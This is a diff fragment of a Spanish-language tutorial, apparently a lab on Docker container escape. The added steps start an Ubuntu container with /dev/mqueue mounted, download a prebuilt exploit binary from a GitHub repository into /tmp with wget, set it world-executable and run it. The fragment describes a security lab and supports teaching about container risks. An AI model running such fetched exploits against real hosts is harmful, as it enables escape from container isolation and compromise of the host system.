@@ -62,3 +62,15 @@ En nuestro caso para solventar este error, se mapeará directamente el directori
 docker run --name contcomprometido -v /dev/mqueue:/dev/mqueue -it ubuntu /bin/bash
 ````
 
+Una vez dentro del contenedor, debemos cambiar de directorio a la carpeta /tmp y descargar el exploit y cambiar sus permisos:
+````
+cd /tmp
+
+apt update && apt install wget
+
+wget https://github.com/SidertiaLabs/contenedoresyseguridad/raw/master/Seccion1DockerEscape/main
+
+chmod 777 /tmp/main
+````
+Se ejecuta el exploit de la sección 1 y se comentan los resultados.
+
